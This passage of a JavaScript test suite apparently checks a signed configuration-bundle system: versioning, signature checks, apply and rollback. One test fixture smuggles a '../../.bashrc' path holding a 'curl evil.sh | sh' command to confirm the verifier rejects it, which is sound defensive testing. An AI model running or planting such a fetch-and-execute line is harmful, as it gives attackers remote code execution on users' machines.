    assert.ok(!JSON.stringify(bundle).includes("runs/"), "a bundle must never carry run state")
  })

  it("versions by content, so nobody has to remember to bump a number", () => {
    assert.equal(bundle.version, buildBundle(CAAO_HOME, { channel: "stable" }).version, "identical bytes, identical version")
    assert.equal(bundle.version.length, 16)
    const changed = bundleVersion({ ...bundle.files, "policies.yaml": `${bundle.files["policies.yaml"]}\n# edit\n` })
    assert.notEqual(changed, bundle.version, "one edited byte must produce a new version")
    assert.notEqual(bundleVersion({ a: "1", b: "2" }), bundleVersion({ a: "2", b: "1" }), "content is bound to its filename")
    assert.equal(bundleVersion({ a: "1", b: "2" }), bundleVersion({ b: "2", a: "1" }), "key order must not matter")
  })

  it("accepts only what the platform team actually signed", () => {
    assert.equal(verifyBundle(bundle, signature, keys.publicKey).ok, true)
    assert.equal(verifyBundle(bundle, signature, keys.publicKey, { expectedChannel: "canary" }).ok, false)

    const tampered = { ...bundle, files: { ...bundle.files, "providers.yaml": "pools: {}\n" } }
    assert.equal(verifyBundle(tampered, signature, keys.publicKey).ok, false)

    const restamped = { ...tampered, version: bundleVersion(tampered.files) }
    assert.equal(verifyBundle(restamped, signature, keys.publicKey).ok, false, "recomputing the version must not launder a forgery")

    assert.equal(verifyBundle(bundle, signature, generateSigningKeys().publicKey).ok, false)
    assert.equal(verifyBundle(bundle, signature, null).reason, "no trusted public key configured")
    assert.equal(verifyBundle(bundle, null, keys.publicKey).ok, false)
  })

  it("refuses a bundle that tries to write outside the managed set", () => {
    const smuggled = { ...bundle, files: { ...bundle.files, "../../.bashrc": "curl evil.sh | sh" } }
    const verdict = verifyBundle(smuggled, signBundle(smuggled, keys.privateKey), keys.publicKey)
    assert.equal(verdict.ok, false)
    assert.match(verdict.reason, /unmanaged file/)

    const gutted = { ...bundle, files: { "policies.yaml": bundle.files["policies.yaml"] } }
    const missing = verifyBundle(gutted, signBundle(gutted, keys.privateKey), keys.publicKey)
    assert.equal(missing.ok, false)
    assert.match(missing.reason, /missing/)
  })

  it("survives an unreadable timestamp — signatures cover content, not clocks", () => {
    const later = { ...bundle, generatedAt: new Date(Date.now() + 86_400_000).toISOString(), notes: "re-published" }
    assert.equal(verifyBundle(later, signature, keys.publicKey).ok, true)
  })

  it("writes only what actually differs", () => {
    const sandbox = mkdtempSync(join(tmpdir(), "caao-bundle-"))
    try {
      const first = applyBundle(bundle, sandbox)
      assert.equal(first.version, bundle.version)
      assert.ok(first.changed.length >= 4)
      assert.equal(readFileSync(join(sandbox, "workflows.yaml"), "utf8"), bundle.files["workflows.yaml"])
      assert.deepEqual(applyBundle(bundle, sandbox).changed, [], "a second apply is a no-op")

      writeFileSync(join(sandbox, "policies.yaml"), "locally hacked\n", "utf8")
      assert.deepEqual(applyBundle(bundle, sandbox).changed, ["policies.yaml"], "local drift is corrected, nothing else is touched")
    } finally {
      rmSync(sandbox, { recursive: true, force: true })
    }
  })

  it("can roll back an applied bundle after validation fails", () => {
    const sandbox = mkdtempSync(join(tmpdir(), "caao-bundle-"))
    try {
      writeFileSync(join(sandbox, "policies.yaml"), "previous policies\n", "utf8")
      const applied = applyBundle(bundle, sandbox)
      rollbackBundle(applied, sandbox)
      assert.equal(readFileSync(join(sandbox, "policies.yaml"), "utf8"), "previous policies\n")
      assert.equal(existsSync(join(sandbox, "providers.yaml")), false)
    } finally {
      rmSync(sandbox, { recursive: true, force: true })
    }
  })

  it("treats the bootstrap file as configuration of last resort", () => {
    const previous = process.env.CAAO_CHANNEL
    try {
      process.env.CAAO_CHANNEL = "canary"
      assert.equal(distributionSettings().channel, "canary", "the environment must be able to move one machine to canary")
    } finally {
      if (previous === undefined) delete process.env.CAAO_CHANNEL
      else process.env.CAAO_CHANNEL = previous
    }

    const settings = distributionSettings()
    assert.equal(typeof settings.autoUpdate, "boolean")
    assert.ok(settings.timeoutMs > 0, "a laptop must never block forever on the config server")
    assert.ok(settings.checkIntervalMinutes > 0)
    assert.match(settings.publicKey, /BEGIN PUBLIC KEY/, "the bootstrap must ship a usable verification key")
  })
})
